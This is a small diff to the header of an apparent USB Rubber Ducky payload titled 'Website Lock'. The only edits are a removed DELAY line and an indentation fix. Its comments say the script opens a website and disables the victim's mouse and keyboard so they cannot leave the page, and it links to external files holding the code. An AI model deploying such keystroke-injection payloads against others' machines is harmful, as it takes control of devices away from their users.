@@ -2,9 +2,8 @@ The explanation is in the code.
 Link to other files: https://www.dropbox.com/sh/i09leu4kcifta6a/AACEFYQnlOIUsDtLLrQuemCha?dl=0 (same link as the one in the code)
 
 Code:
-	DELAY 100
 	REM Title: Website Lock
-        REM Author: Audiack
+	REM Author: Audiack
 	REM Target Ducky Encoder: 2.6.2
 	REM Target OS: Windows 7 (32 and 64 bit), maybe older/newer windows versions. Haven't tested it on any other than 7.
 	REM Description: Plays off of Aprizm's script to open a website, but it also disables the mouse and keyboard so the user can't leave the website.
